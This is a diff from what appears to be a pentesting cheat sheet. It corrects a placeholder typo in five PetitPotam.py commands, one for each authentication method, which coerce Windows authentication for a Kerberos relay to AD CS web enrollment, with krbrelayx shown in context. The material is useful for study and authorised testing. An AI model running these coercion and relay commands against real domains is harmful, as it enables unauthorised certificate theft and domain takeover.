@@ -376,27 +376,27 @@ python3 krbrelayx.py -t 'https://<DC_HOSTNAME>.<DOMAIN>/certsrv/certfnsh.asp' --
 
 ```console {class="password"}
 # Password
-python3 PetitPotam.py -d <DOMAIN> -u '<UESR>' -p '<PASSWORD>' '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+python3 PetitPotam.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
 ```
 
 ```console {class="ntlm"}
 # NTLM
-python3 PetitPotam.py -d <DOMAIN> -u '<UESR>' -hashes :<HASH> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+python3 PetitPotam.py -d <DOMAIN> -u '<USER>' -hashes :<HASH> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
 ```
 
 ```console {class="password-based-kerberos"}
 # Password-based Kerberos
-python3 PetitPotam.py -d <DOMAIN> -u '<UESR>' -p '<PASSWORD>' -k -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+python3 PetitPotam.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
 ```
 
 ```console {class="ntlm-based-kerberos"}
 # NTLM-based Kerberos
-python3 PetitPotam.py -d <DOMAIN> -u '<UESR>' -hashes :<HASH> -k -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+python3 PetitPotam.py -d <DOMAIN> -u '<USER>' -hashes :<HASH> -k -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
 ```
 
 ```console {class="ticket-based-kerberos"}
 # Ticket-based Kerberos
-python3 PetitPotam.py -d <DOMAIN> -u '<UESR>' -k -no-pass -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
+python3 PetitPotam.py -d <DOMAIN> -u '<USER>' -k -no-pass -dc-ip <DC_IP> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
 ```
 
 #### 6. Request a Ticket Using pfx file
